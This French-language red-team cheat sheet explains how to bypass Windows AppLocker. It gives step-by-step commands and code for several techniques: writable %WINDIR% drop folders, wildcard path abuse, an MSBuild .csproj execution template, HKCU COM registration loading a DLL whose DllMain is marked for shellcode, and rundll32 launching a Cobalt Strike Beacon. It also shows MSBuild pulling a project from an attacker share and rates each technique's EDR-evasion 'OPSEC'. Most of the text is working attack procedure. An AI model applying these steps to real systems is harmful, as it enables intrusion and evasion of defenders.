# AppLocker

## Présentation

AppLocker contrôle l’exécution des applications à l’aide de règles **Allow/Deny** appliquées aux utilisateurs ou groupes, selon trois types de conditions :
- **Publisher** — chaîne de certificats du binaire signé.
- **Path** — chemin de fichier ou de dossier, avec prise en charge des wildcards.
- **File Hash** — hash SHA256 du fichier.

**Les règles par défaut autorisent l’exécution depuis `%PROGRAMFILES%\*` et `%WINDIR%\*` pour Everyone.**
Les administrateurs (`BUILTIN\Administrators`) disposent d’une autorisation wildcard.

---

## Énumération des politiques

### Depuis le Registry de la machine cible

```powershell
# Raw registry keys
Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2'

# Parsed — readable rule output
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections
```

Chemin Registry : `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
Chaque sous-clé correspond à un type de règle (Exe, Script, Msi, Appx, Dll).

### Depuis la GPO (Beacon sur une machine non protégée)

```cs
// Step 1 — find the AppLocker GPO by name
beacon> ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath

// Step 2 — list the GPO machine policy folder
beacon> ls \\contoso.com\SysVol\contoso.com\Policies\{GPO-GUID}\Machine

// Step 3 — parse Registry.pol (sync to attacker desktop first)
```

```powershell
# On attacker Windows box (requires GpRegistryPolicy module)
Parse-PolFile -Path .\Desktop\Registry.pol
```

### Vérifier le PowerShell Language Mode

```powershell
$ExecutionContext.SessionState.LanguageMode
# FullLanguage  = no AppLocker / not enforcing PS scripts
# ConstrainedLanguage = AppLocker is active
```

---

## Arbre de décision pour le bypass

```
1. Enumerate policy → look for:
   a. Path wildcard misconfigurations  →  write to allowed dir and execute
   b. Writable dirs under %WINDIR%\*  →  drop payload there and run
   c. DLL rules disabled              →  rundll32 bypass
   d. CLM but not Full Lockdown       →  COM object / WScript.Shell technique
   e. LOLBAS in allowed paths         →  MSBuild .csproj execution
```

---

## Bypass 1 — Mauvaise configuration d’une wildcard Path

Rechercher les règles personnalisées dont le chemin n’est pas ancré par `%PROGRAMFILES%` ou `%WINDIR%` :

```xml
<!-- Vulnerable rule example — ANY folder named App-V is allowed -->
<FilePathCondition Path="*\App-V\*"/>
```

**Exploitation :** créer `C:\Users\<user>\App-V\` et y placer le payload pour correspondre à la wildcard.

---

## Bypass 2 — Dossiers accessibles en écriture sous `%WINDIR%\*`

Selon les permissions locales, des utilisateurs standard peuvent écrire dans certains de ces chemins situés dans une zone autorisée par défaut :

```
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\Tracing
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
```

**Exploitation :** déposer un exécutable, script ou installer dans un chemin autorisé, puis l’exécuter.

```powershell
# Find additional writable dirs under Windows
Get-Acl C:\Windows\* | Where-Object { $_.Access | Where-Object { $_.IdentityReference -match "Everyone|Users" -and $_.FileSystemRights -match "Write" } }
icacls C:\Windows\Tasks
```

---

## Bypass 3 — LOLBAS avec MSBuild

`MSBuild.exe` se trouve dans `%WINDIR%\Microsoft.NET\Framework\v4.0.30319\` : ce chemin est généralement autorisé par les règles par défaut. MSBuild exécute du code C# contenu dans un fichier `.csproj`.

**Étape 1 — Créer `bypass.csproj` :**

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuild/>
  </Target>
   <UsingTask
    TaskName="MSBuild"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
     <Task>
      <Reference Include="System.Windows.Forms" />
      <Code Type="Class" Language="cs">
        <![CDATA[
        using Microsoft.Build.Utilities;
        using System.Windows.Forms;

        public class MSBuild : Task
        {
            public override bool Execute()
            {
                // Replace MessageBox with shellcode exec / beacon staging
                MessageBox.Show("Hello World", "AppLocker Bypass");
                return true;
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

**Étape 2 — Exécuter :**

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe bypass.csproj
```

> **OPSEC-CAUTION:** L’exécution de child processes par MSBuild est détectable par les EDR modernes. L’exécution inline dans la Task n’a pas le même profil de détection que la création de nouveaux processus.

---

## Bypass 4 — PowerShell CLM via un objet COM personnalisé

AppLocker peut contraindre PowerShell au mode `ConstrainedLanguage`, qui restreint certains appels aux API .NET. Dans le scénario décrit, `New-Object -ComObject` reste utilisable.

**Technique :** enregistrer un CLSID COM dans HKCU pointant vers une DLL, puis charger celle-ci via `New-Object`.

**Étape 1 — Générer un GUID :**

```powershell
[System.Guid]::NewGuid()
# Example output: 6136e053-47cb-4fdd-84b1-381bc5f3edb3
```

**Étape 2 — Enregistrer l’objet COM dans HKCU (sans privilèges admin) :**

```powershell
$guid = '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
$dllPath = 'C:\Windows\Tasks\bypass.dll'   # writable path under %WINDIR%

New-Item -Path "HKCU:Software\Classes\CLSID" -Name $guid
New-Item -Path "HKCU:Software\Classes\CLSID\$guid" -Name 'InprocServer32' -Value $dllPath
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\$guid\InprocServer32" -Name 'ThreadingModel' -Value 'Both'

New-Item -Path 'HKCU:Software\Classes' -Name 'AppLocker.Bypass' -Value 'AppLocker Bypass'
New-Item -Path 'HKCU:Software\Classes\AppLocker.Bypass' -Name 'CLSID' -Value $guid
```

**Étape 3 — Déclencher le chargement de la DLL :**

```powershell
New-Object -ComObject AppLocker.Bypass
```

**DLL template (DllMain executes on load):**

```c
#include <windows.h>

extern "C" __declspec(dllexport) BOOL execute() {
    // Beacon staging / shellcode exec here
    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
        return execute();
    return TRUE;
}
```

> **OPSEC-SAFE:** L’exécution se fait dans le processus PowerShell, sans child process. Seules des écritures dans HKCU sont requises. La DLL doit se trouver dans un chemin autorisé par AppLocker.

---

## Bypass 5 — rundll32 lorsque les règles DLL sont désactivées

Les règles d’application aux DLL sont **désactivées par défaut** dans de nombreuses configurations pour des raisons de performance. Lorsqu’elles sont inactives, `rundll32` peut charger une DLL sans contrôle AppLocker sur celle-ci.

`rundll32.exe` se trouve sous `%WINDIR%\System32\`, généralement autorisé par les règles standard.

**Le payload DLL Beacon de Cobalt Strike exporte `StartW` :**

```cmd
rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
```

> **OPSEC-CAUTION:** `rundll32` est fortement surveillé par les EDR. Vérifier la configuration `spawnto` et du Malleable C2 Profile ; évaluer les risques de détection.

Vérifier d’abord que les règles DLL sont désactivées :

```powershell
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections | Where-Object { $_.RuleCollectionType -eq 'Dll' }
# Empty output = DLL rules not configured = rundll32 bypass viable
```

---

## Challenge AppLocker — Méthodologie

Suivre cette checklist dans l’ordre pour identifier les possibilités de bypass.

### Étape 1 — Vérifier si AppLocker est actif

```powershell
$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage confirms AppLocker enforcement
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

### Étape 2 — Énumérer toutes les règles

```powershell
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections | Format-List *
# Look for: custom path rules with loose wildcards, missing rule types (DLL = off?)
```

### Étape 3 — Vérifier les règles DLL

```powershell
$policy.RuleCollections | Where-Object { $_.RuleCollectionType -eq 'Dll' }
# Empty → rundll32 bypass available → go to Bypass 5
```

### Étape 4 — Vérifier les chemins autorisés accessibles en écriture

```cmd
icacls C:\Windows\Tasks
icacls C:\Windows\Temp
icacls C:\Windows\Tracing
```

If writable → drop payload (exe, script, DLL) → execute directly.

### Étape 5 — Rechercher les wildcard Path mal configurées

```powershell
$policy.RuleCollections | ForEach-Object { $_.Rules } | Where-Object { $_ -is [Microsoft.Security.ApplicationId.PolicyManagement.PolicyModel.FilePathRule] } | Select-Object Name, Conditions
# Look for rules where path starts with * (not anchored to %WINDIR% or %PROGRAMFILES%)
```

Créer un dossier correspondant à la règle, puis exécuter depuis ce chemin.

### Étape 6 — Bypass CLM via COM (si PowerShell est contraint)

Utiliser le Bypass 4 décrit plus haut. Il faut pouvoir écrire une DLL dans un chemin autorisé.

### Étape 7 — MSBuild LOLBAS

Si un fichier `.csproj` peut être écrit sur disque (son chemin n’a pas nécessairement besoin d’être autorisé, car MSBuild le lit comme donnée) :

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\attacker\share\bypass.csproj
# Or write to C:\Windows\Tasks\bypass.csproj
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Tasks\bypass.csproj
```

### Étape 8 — Beacon Cobalt Strike depuis un chemin autorisé

Si un Beacon est déjà présent et qu’il faut migrer ou préparer un nouvel implant sur un hôte protégé par AppLocker :

```cs
// Option A: rundll32 (DLL rules off)
beacon> shell rundll32.exe C:\Windows\Tasks\beacon.dll,StartW

// Option B: MSBuild .csproj with inline shellcode (in-memory exec via C# Task)
beacon> shell C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Tasks\stage.csproj

// Option C: execute-assembly from existing Beacon (bypasses AppLocker entirely — runs in Beacon memory)
beacon> execute-assembly C:\Tools\tool.exe
```

> `execute-assembly` charge des assemblies .NET en mémoire dans le contexte d’exécution du Beacon. Le contrôle AppLocker ne s’applique pas de la même manière que lors du lancement d’un exécutable classique.

---

## Récapitulatif OPSEC

| Technique | OPSEC | Remarques |
|-----------|-------|-------|
| Dossier `%WINDIR%` en écriture | CAUTION | Dépose un fichier dans un chemin potentiellement surveillé |
| MSBuild `.csproj` | CAUTION | Exécution de code MSBuild visible pour l’EDR |
| Chargement DLL par rundll32 | CAUTION | rundll32 fortement surveillé par l’EDR |
| Bypass COM CLM | SAFE | Chargement DLL dans le processus, HKCU uniquement |
| execute-assembly | SAFE | Chargement en mémoire dans le processus Beacon |
| Abus de wildcard Path | SAFE | Aucun nouveau fichier si le payload est déjà présent |

---

## Référence rapide

```
ENUMERATE:   Get-AppLockerPolicy -Effective | Select -Expand RuleCollections
CLM CHECK:   $ExecutionContext.SessionState.LanguageMode
DLL RULES:   $policy.RuleCollections | ? { $_.RuleCollectionType -eq 'Dll' }
WRITABLE:    icacls C:\Windows\Tasks | C:\Windows\Temp | C:\Windows\Tracing
MSBUILD:     C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe bypass.csproj
RUNDLL32:    rundll32.exe C:\Windows\Tasks\beacon.dll,StartW   (DLL rules must be off)
COM BYPASS:  New-Object -ComObject AppLocker.Bypass             (after HKCU CLSID reg)
IN-MEMORY:   beacon> execute-assembly <tool.exe>               (bypasses AppLocker)
GPO ENUM:    ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath
```
